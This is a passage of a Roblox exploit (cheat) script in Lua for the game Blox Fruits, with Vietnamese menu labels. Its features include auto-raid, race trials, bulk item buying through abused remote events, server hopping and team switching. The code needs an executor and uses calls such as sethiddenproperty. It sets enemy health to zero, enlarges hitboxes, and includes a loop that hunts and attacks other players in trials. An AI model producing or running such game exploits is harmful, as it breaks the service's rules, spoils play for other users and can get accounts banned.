    [1]="LoadFruit",
    [2]="Ice-Ice"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Sand-Sand"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Dark-Dark"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Ghost-Ghost"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Diamond-Diamond"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Light-Light"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Rubber-Rubber"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Barrier-Barrier"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
end)
end
end)
if Sea2 then
Tabs.Raid:AddButton({
    Title="Bay Đến Chỗ Tập Kích",
    Description="",
    Callback=function()
     Tween(CFrame.new(-6438.73535, 250.645355,-4501.50684))
end
})
elseif Sea3 then
    Tabs.Raid:AddButton({
        Title="Bay Đến Chỗ Tập Kích",
        Description="",
        Callback=function()
         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-5075.50927734375, 314.5155029296875,-3150.0224609375))
           Tween(CFrame.new(-5017.40869, 314.844055,-2823.0127,-0.925743818, 4.48217499e-08,-0.378151238, 4.55503146e-09, 1, 1.07377559e-07, 0.378151238, 9.7681621e-08,-0.925743818))
        end
        })
end
local Mastery = Tabs.Raid:AddSection("Tập Kích Law")
local ToggleLaw = Tabs.Raid:AddToggle("ToggleLaw", {Title="Mua Chip Và Đấm Law",Description="", Default=false })
ToggleLaw:OnChanged(function(Value)
    Auto_Law=Value
end)
Options.ToggleLaw:SetValue(false)
spawn(function()
    pcall(function()
        while wait() do
            if Auto_Law then
                if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Microchip") and not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Microchip") and not game:GetService("Workspace").Enemies:FindFirstChild("Order") and not game:GetService("ReplicatedStorage"):FindFirstChild("Order") then
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Microchip","1")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Microchip","2")
                end
            end
        end
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            if Auto_Law then
                if not game:GetService("Workspace").Enemies:FindFirstChild("Order") and not game:GetService("ReplicatedStorage"):FindFirstChild("Order") then
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Microchip") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Microchip") then
                        fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector)
                    end
                end
                if game:GetService("ReplicatedStorage"):FindFirstChild("Order") or game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Order" then
                                repeat wait(_G.Fast_Delay)
                                    
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                until not v.Parent or v.Humanoid.Health<=0 or Auto_Law==false
                            end
                        end
                    elseif game:GetService("ReplicatedStorage"):FindFirstChild("Order") then
                        Tween(CFrame.new(-6217.2021484375, 28.047645568848,-5053.1357421875))
                    end
                end
            end
        end
    end)
end)
Tabs.Race:AddButton({
    Title="Đền Thời Gian",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28286.35546875, 14895.3017578125, 102.62469482421875))
    end
})
Tabs.Race:AddButton({
    Title="Cần Gạt",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28286.35546875, 14895.3017578125, 102.62469482421875))
        Tween(CFrame.new(28575.181640625, 14936.6279296875, 72.31636810302734))
    end
})
Tabs.Race:AddButton({
    Title="Chỗ Mua Gear",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28286.35546875, 14895.3017578125, 102.62469482421875))
        Tween(CFrame.new(28981.552734375, 14888.4267578125,-120.245849609375))
    end
})
local Mastery = Tabs.Race:AddSection("Tộc")
Tabs.Race:AddButton({
    Title="Cửa Tộc",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28286.35546875, 14895.3017578125, 102.62469482421875))
                    if game:GetService("Players").LocalPlayer.Data.Race.Value=="Human" then
                    Tween(CFrame.new(29221.822265625, 14890.9755859375,-205.99114990234375))
                    elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Skypiea" then
                    Tween(CFrame.new(28960.158203125, 14919.6240234375, 235.03948974609375))
                    elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Fishman" then
                    Tween(CFrame.new(28231.17578125, 14890.9755859375,-211.64173889160156))
                    elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Cyborg" then
                    Tween(CFrame.new(28502.681640625, 14895.9755859375,-423.7279357910156))
                    elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Ghoul" then
                    Tween(CFrame.new(28674.244140625, 14890.6767578125, 445.4310607910156))
                    elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Mink" then
                    Tween(CFrame.new(29012.341796875, 14890.9755859375,-380.1492614746094))
                    end
    end
})
local ToggleHumanandghoul = Tabs.Race:AddToggle("ToggleHumanandghoul", {Title="Hoàn Thành Ải [Human/Ghoul]",Description="", Default=false })
ToggleHumanandghoul:OnChanged(function(Value)
    KillAura=Value
end)
Options.ToggleHumanandghoul:SetValue(false)
local ToggleAutotrial = Tabs.Race:AddToggle("ToggleAutotrial", {Title="Hoàn Thành Ải",Description="", Default=false })
ToggleAutotrial:OnChanged(function(Value)
    _G.AutoQuestRace=Value
end)
Options.ToggleAutotrial:SetValue(false)
spawn(function()
    pcall(function()
        while wait() do
            if _G.AutoQuestRace then
                if game:GetService("Players").LocalPlayer.Data.Race.Value=="Human" then
                    for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                            pcall(function()
                                repeat wait()
                                    v.Humanoid.Health=0
                                    v.HumanoidRootPart.CanCollide=false
                                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                until not _G.AutoQuestRace or not v.Parent or v.Humanoid.Health<=0
                            end)
                        end
                    end
                elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Skypiea" then
                    for i,v in pairs(game:GetService("Workspace").Map.SkyTrial.Model:GetDescendants()) do
                        if v.Name=="snowisland_Cylinder.081" then
                            BKP(v.CFrame*CFrame.new(0,0,0))
                        end
                    end
                elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Fishman" then
                    for i,v in pairs(game:GetService("Workspace").SeaBeasts.SeaBeast1:GetDescendants()) do
                        if v.Name=="HumanoidRootPart" then
                            Tween(v.CFrame*Pos)
                            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v:IsA("Tool") then
                                    if v.ToolTip=="Melee" then
                                        game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                    end
                                end
                            end
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v:IsA("Tool") then
                                    if v.ToolTip=="Blox Fruit" then
                                        game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                    end
                                end
                            end
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait()
                            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v:IsA("Tool") then
                                    if v.ToolTip=="Sword" then
                                        game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                    end
                                end
                            end
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait()
                            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v:IsA("Tool") then
                                    if v.ToolTip=="Gun" then
                                        game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                    end
                                end
                            end
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            wait(.2)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        end
                    end
                elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Cyborg" then
                    Tween(CFrame.new(28654, 14898.7832,-30, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Ghoul" then
                    for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                            pcall(function()
                                repeat wait()
                                    v.Humanoid.Health=0
                                    v.HumanoidRootPart.CanCollide=false
                                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                until not _G.AutoQuestRace or not v.Parent or v.Humanoid.Health<=0
                            end)
                        end
                    end
                elseif game:GetService("Players").LocalPlayer.Data.Race.Value=="Mink" then
                    for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v.Name=="StartPoint" then
                            Tween(v.CFrame*CFrame.new(0,10,0))
                          end
                       end
                end
            end
        end
    end)
end)
local ToggleKillTrial = Tabs.Race:AddToggle("ToggleKillTrial", {Title="Đấm Người Chơi Trong Trial", Description="", Default=false})
ToggleKillTrial:OnChanged(function(Value)
    _G.AutoKillTrial=Value
end)
Options.ToggleKillTrial:SetValue(false)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoKillTrial then
                for _, v in pairs(game:GetService("Players"):GetChildren()) do
                    if v.Name and v.Name ~=game.Players.LocalPlayer.Name and 
                       (v.Character.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                        if v.Character.Humanoid.Health>0 then
                            repeat
                                wait(_G.Fast_Delay)
                                EquipWeapon(SelectWeapon)
                                Click()


AutoHaki()
                                Tween(v.Character.HumanoidRootPart.CFrame*CFrame.new(0, 0, 5))
                                v.Character.HumanoidRootPart.CanCollide=false
                                v.Character.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                
                            until not _G.AutoKillTrial or not v.Parent or v.Character.Humanoid.Health<=0
                        end
                    end
                end
            end
        end)
    end
end)
local Mastery = Tabs.Race:AddSection("Huấn Luyện")
local ToggleFarmRace = Tabs.Race:AddToggle("ToggleFarmRace", {Title="Cày Luyện Tộc", Description="", Default=false})
local AutoFarmRace = false 
ToggleFarmRace:OnChanged(function(Value)
    AutoFarmRace=Value
end)
Options.ToggleFarmRace:SetValue(false)
spawn(function()
    while wait() do
        if AutoFarmRace then 
            pcall(function()
                if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
                    if game.Players.LocalPlayer.Character.RaceTransformed.Value==true then
                        _G.AutoBoneNoQuest=false
                        Tween(CFrame.new(-9698.4736328125, 445.09442138671875, 6545.8525390625))
                    elseif game.Players.LocalPlayer.Character.RaceTransformed.Value==false then
                        _G.AutoBoneNoQuest=true
                        game:GetService("VirtualInputManager"):SendKeyEvent(true, "Y", false, game)
                        wait()
                        game:GetService("VirtualInputManager"):SendKeyEvent(false, "Y", false, game)
                    end
                end
            end)
        else
            _G.AutoBoneNoQuest=false 
        end
    end
end)
local ToggleUpgrade = Tabs.Race:AddToggle("ToggleUpgrade", {Title="Mua Gear", Description="", Default=false })
ToggleUpgrade:OnChanged(function(Value)
    _G.AutoUpgrade=Value
    if _G.AutoUpgrade then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer('UpgradeRace', 'Buy')
    end
end)
Options.ToggleUpgrade:SetValue(false)

local Mastery = Tabs.Shop:AddSection("Mua Full")

Tabs.Shop:AddButton({
    Title="Mua Full Khả Năng",
    Description="",
    Callback=function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk", "Buy")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Geppo")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Buso")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Soru")
    end
})

Tabs.Shop:AddButton({
    Title="Mua Full Kiếm",
    Description="",
    Callback=function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Duel Katana")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Pipe")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ThunderGodTalk")
    end
})

Tabs.Shop:AddButton({
    Title="Mua Full Súng",
    Description="",
    Callback=function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Slingshot")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual Flintlock")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Slingshot","2")
    end
})

Tabs.Shop:AddButton({
    Title="Mua Full Phụ Kiện",
    Description="",
    Callback=function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Swordsman Hat")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
    end
})

local Mastery = Tabs.Shop:AddSection("Khả Năng")
Tabs.Shop:AddButton({
    Title="Geppo",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Geppo")
    end
})
Tabs.Shop:AddButton({
    Title="Buso",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Buso")
    end
})
Tabs.Shop:AddButton({
    Title="Soru",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Soru")
    end
})
Tabs.Shop:AddButton({
    Title="Ken",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk","Buy")
    end
})
local Mastery = Tabs.Shop:AddSection("Kiếm")
Tabs.Shop:AddButton({
    Title="Cutlass",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
    end
})
Tabs.Shop:AddButton({
    Title="Katana",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
    end
})
Tabs.Shop:AddButton({
    Title="Iron Mace",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
    end
})
Tabs.Shop:AddButton({
    Title="Duel Katana",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Duel Katana")
    end
})
Tabs.Shop:AddButton({
    Title="Triple Katana",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
    end
})
Tabs.Shop:AddButton({
    Title="Pipe",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Pipe")
    end
})
Tabs.Shop:AddButton({
    Title="Dual-Headed Blade",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
    end
})
Tabs.Shop:AddButton({
    Title="Bisento",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
    end
})
Tabs.Shop:AddButton({
    Title="Soul Cane",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
    end
})
Tabs.Shop:AddButton({
    Title="Pole V2",
    Description="",
    Callback=function()
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ThunderGodTalk")
    end
})
local Mastery = Tabs.Shop:AddSection("Súng")
Tabs.Shop:AddButton({
    Title="Musket",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
    end
})
Tabs.Shop:AddButton({
    Title="Slingshot",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
    end
})
Tabs.Shop:AddButton({
    Title="Flintlock",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
    end
})
Tabs.Shop:AddButton({
    Title="Refined Slingshot",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Slingshot")
    end
})
Tabs.Shop:AddButton({
    Title="Dual Flintlock",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual Flintlock")
    end
})
Tabs.Shop:AddButton({
    Title="Cannon",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
    end
})
Tabs.Shop:AddButton({
    Title="Kabucha",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Slingshot","2")
    end
})
local Mastery = Tabs.Shop:AddSection("Phụ Kiện")
Tabs.Shop:AddButton({
    Title="Black Cape",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
    end
})
Tabs.Shop:AddButton({
    Title="Swordsman Hat",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Swordsman Hat")
    end
})
Tabs.Shop:AddButton({
    Title="Tomoe Ring",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
    end
})
local Mastery = Tabs.Shop:AddSection("Võ")
Tabs.Shop:AddButton({
    Title="Black Leg",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
    end
})
Tabs.Shop:AddButton({
    Title="Electro",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
    end
})
Tabs.Shop:AddButton({
    Title="Fishman Karate",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
    end
})
Tabs.Shop:AddButton({
    Title="Dragon Claw",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
    end
})
Tabs.Shop:AddButton({
    Title="Superhuman",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
    end
})
Tabs.Shop:AddButton({
    Title="Death Step",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
    end
})
Tabs.Shop:AddButton({
    Title="Sharkman Karate",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
    end
})
Tabs.Shop:AddButton({
    Title="Electric Claw",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
    end
})
Tabs.Shop:AddButton({
    Title="Dragon Talon",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
    end
})
Tabs.Shop:AddButton({
    Title="Godhuman",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
    end
})
Tabs.Shop:AddButton({
    Title="Sanguine Art",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySanguineArt")
    end
})
local Mastery = Tabs.Shop:AddSection("Khác")
Tabs.Shop:AddButton({
    Title="Đổi Chỉ Số",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","1")
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","2")
    end
})
Tabs.Shop:AddButton({
    Title="Đổi Tộc",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "1")
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2")
    end
})
Tabs.Shop:AddButton({
    Title="Đổi Tộc Ghoul",
    Description="",
    Callback=function()
        local args = {
            [1]="Ectoplasm",
            [2]="Change",
            [3]=4
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
Tabs.Shop:AddButton({
    Title="Đổi Tộc Cyborg",
    Description="",
    Callback=function()
        local args = {
            [1]="CyborgTrainer",
            [2]="Buy"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
Tabs.Shop:AddButton({
    Title="Đổi Tộc Draco",
    Description="Chỉ Ở Biển 3",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5661.5322265625, 1013.0907592773438,-334.9649963378906))
        Tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
        local targetPosition = Vector3.new(5814.42724609375, 1208.3267822265625, 884.5785522460938)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        repeat
            wait()
        until (character.HumanoidRootPart.Position-targetPosition).Magnitude<1000000000
        local args = {
            [1]={
                ["NPC"]="Dragon Wizard",
                ["Command"]="DragonRace"
            }
        }
        game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack(args))
    end
})
Tabs.Misc:AddButton({
    Title="Tham Gia Máy Chủ Lại",
    Description="",
    Callback=function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
    end
})
Tabs.Misc:AddButton({
    Title="Đổi Máy Chủ",
    Description="",
    Callback=function()
        Hop()
    end
})
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
        local Site;
        if foundAnything=="" then
            Site=game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site=game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~="null" and Site.nextPageCursor ~=nil then
            foundAnything=Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID=tostring(v.id)
            if tonumber(v.maxPlayers)>tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~=0 then
                        if ID==tostring(Existing) then
                            Possible=false
                        end
                    else
                        if tonumber(actualHour) ~=tonumber(Existing) then
                            local delFile = pcall(function()
                                AllIDs={}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num=num+1
                end
                if Possible==true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        wait()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait()
                end
            end
        end
    end
    function Teleport() 
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~="" then
                    TPReturner()
                end
            end)
        end
    end
    Teleport()
end      
local Mastery = Tabs.Misc:AddSection("Đội")
Tabs.Misc:AddButton({
    Title="Hải Tặc",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Pirates") 
    end
})
Tabs.Misc:AddButton({
    Title="Hải Quân",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Marines") 
    end
})
local Mastery = Tabs.Misc:AddSection("Kinh Nghiệm")
